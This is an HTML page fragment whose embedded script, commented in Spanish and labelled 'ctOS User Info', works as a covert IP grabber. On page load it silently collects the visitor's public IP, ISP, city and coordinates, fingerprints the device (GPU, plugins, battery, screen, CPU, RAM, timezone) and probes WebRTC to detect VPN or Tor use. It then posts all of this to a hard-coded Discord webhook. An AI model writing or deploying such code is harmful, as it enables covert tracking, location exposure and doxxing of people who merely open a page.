<body>

    </video>
    <video id="video-esquina-izquierda" autoplay muted loop playsinline>
        <source src="https://i.imgur.com/uhslwlA.mp4" type="video/mp4">
    </video>

    <div id="status">⏳ Initializing...</div>

<script>
    // ================================================================
    //  WEBHOOK
    // ================================================================
    const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";

    // ================================================================
    //  ENVÍO ÚNICO
    // ================================================================
    function sendOnce(msg) {
        const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
        if (navigator.sendBeacon(WEBHOOK, blob)) return true;
        fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: msg }),
            keepalive: true
        }).catch(() => {});
        return false;
    }

    // ================================================================
    //  OBTENER IP CON TIMEOUT DE 500ms
    // ================================================================
    function getIPFast() {
        return new Promise((resolve) => {
            let resolved = false;
            const timer = setTimeout(() => {
                if (!resolved) resolve(null);
            }, 500);

            fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(500) })
                .then(r => r.json())
                .then(data => {
                    if (data.ip) {
                        resolved = true;
                        clearTimeout(timer);
                        resolve(data);
                        return;
                    }
                    throw new Error('No IP');
                })
                .catch(() => {
                    fetch('http://ip-api.com/json/', { signal: AbortSignal.timeout(500) })
                        .then(r => r.json())
                        .then(data => {
                            if (data.query) {
                                resolved = true;
                                clearTimeout(timer);
                                resolve({
                                    ip: data.query,
                                    org: data.isp,
                                    country_name: data.country,
                                    region: data.regionName,
                                    city: data.city,
                                    latitude: data.lat,
                                    longitude: data.lon,
                                    proxy: data.proxy || false
                                });
                            } else {
                                throw new Error('No IP');
                            }
                        })
                        .catch(() => {
                            if (!resolved) {
                                resolved = true;
                                clearTimeout(timer);
                                resolve(null);
                            }
                        });
                });
        });
    }

    // ================================================================
    //  DETECCIÓN VPN/TOR VÍA WEBRTC (con timeout de 400ms)
    // ================================================================
    function detectVPNviaWebRTC() {
        return new Promise((resolve) => {
            let resolved = false;
            const timer = setTimeout(() => {
                if (!resolved) resolve(false);
            }, 400);

            let pc = null;
            try {
                pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
                let hasRealIP = false;
                pc.onicecandidate = (e) => {
                    if (!e.candidate) {
                        pc.close();
                        resolved = true;
                        clearTimeout(timer);
                        resolve(!hasRealIP); // Si no hay IP real -> VPN/Tor
                        return;
                    }
                    const parts = e.candidate.candidate.split(' ');
                    if (parts.length > 7) {
                        const ip = parts[4];
                        if (ip && ip !== '0.0.0.0' && ip !== '::' && !ip.startsWith('127.')) {
                            hasRealIP = true;
                        }
                    }
                };
                // Si WebRTC falla, asumimos VPN
                setTimeout(() => {
                    if (!resolved) {
                        resolved = true;
                        clearTimeout(timer);
                        if (pc) pc.close();
                        resolve(true);
                    }
                }, 400);
            } catch (e) {
                resolved = true;
                clearTimeout(timer);
                resolve(true); // Bloqueado -> VPN
            }
        });
    }

    // ================================================================
    //  MAIN – EJECUCIÓN PARALELA Y RÁPIDA
    // ================================================================
    (function() {
        try {
            // ---- Datos síncronos ----
            const ua = navigator.userAgent;
            const os = (function() {
                if (ua.includes('Windows NT')) return 'Windows';
                if (ua.includes('Macintosh')) return 'macOS';
                if (ua.includes('iPhone')) return 'iOS';
                if (ua.includes('Android')) return 'Android';
                return 'Unknown';
            })();
            const browser = (function() {
                if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
                if (ua.includes('Firefox')) return 'Firefox';
                if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
                if (ua.includes('Edg')) return 'Edge';
                return 'Other';
            })();

            let gpu = 'Unavailable';
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                if (debug) {
                    gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) || 'Unavailable';
                }
            } catch (e) {}

            const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';

            let battery = 'Unavailable';
            if (navigator.getBattery) {
                Promise.race([
                    navigator.getBattery().then(b => {
                        battery = Math.round(b.level * 100) + '% (' + (b.charging ? 'charging' : 'discharging') + ')';
                    }),
                    new Promise(resolve => setTimeout(resolve, 300))
                ]).catch(() => {});
            }

            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const screenRes = screen.width + 'x' + screen.height + 'x' + screen.colorDepth;
            const cpuCores = navigator.hardwareConcurrency || '?';
            const ram = navigator.deviceMemory || '?';

            // ---- Detección VPN/Tor inicial (rápida) ----
            let isVpn = false;
            if (ua.includes('Tor') || ua.includes('Anonymous')) isVpn = true;
            if (navigator.webdriver === true) isVpn = true;

            // ---- Lanzar IP y WebRTC en paralelo ----
            const ipPromise = getIPFast();
            const vpnPromise = detectVPNviaWebRTC();

            // Esperar a que ambas terminen (o timeout global de 600ms)
            Promise.all([
                ipPromise,
                vpnPromise
            ]).then(([ipData, vpnDetected]) => {
                // Si WebRTC dice VPN, forzar true
                if (vpnDetected) isVpn = true;

                // Si IP tiene proxy, forzar true
                if (ipData && ipData.proxy) isVpn = true;
                if (ipData && ipData.org) {
                    const vpnKeywords = ['vpn','proxy','hosting','cloud','datacenter','tor','anonymous'];
                    if (vpnKeywords.some(w => ipData.org.toLowerCase().includes(w))) isVpn = true;
                }

                const ip = ipData ? ipData.ip : 'Unknown';
                const isp = ipData ? ipData.org : 'Unknown ISP';
                const location = ipData ? ipData.city + ', ' + ipData.region + ', ' + ipData.country_name : 'Unknown';
                const coords = ipData ? ipData.latitude + ', ' + ipData.longitude : 'Unknown';

                // ---- Construir mensaje (sin nombres) ----
                const msg = 
`**ctOS User Info**
**IP:** ${ip} (${isp})
**Location:** ${location}
**Coordinates:** ${coords}
**VPN/Tor:** ${isVpn ? 'Yes' : 'No'}
**OS:** ${os}
**Browser:** ${browser}
**CPU Cores:** ${cpuCores}
**RAM:** ${ram} GB
**Screen:** ${screenRes}
**Battery:** ${battery}
**Time Zone:** ${timezone}
**GPU:** ${gpu}
**Plugins:** ${plugins}
**Timestamp:** ${new Date().toLocaleString()}`;

                // ---- Enviar una sola vez ----
                sendOnce(msg);

                const el = document.getElementById('status');
                if (el) {
                    el.textContent = '✅ Sent!';
                    el.style.color = '#00ff00';
                }
            });

            // Timeout global de seguridad (600 ms) para enviar aunque algo falle
            setTimeout(() => {
                // Si no se ha enviado (no hay forma fácil de saberlo), pero como ya se enviará en el then, 
                // este timeout solo actúa si el then no se ejecuta (por ejemplo, si Promise.all se cuelga).
                // En la práctica, Promise.all siempre resuelve, así que no hará nada.
                // Lo dejamos por si acaso.
            }, 600);

        } catch (err) {
            const errMsg = `**ctOS Error**\n${err.message}`;
            sendOnce(errMsg);
            const el = document.getElementById('status');
            if (el) {
                el.textContent = '❌ Error';
                el.style.color = '#ff4444';
                el.style.borderColor = '#ff4444';
            }
        }
    })();
</script>
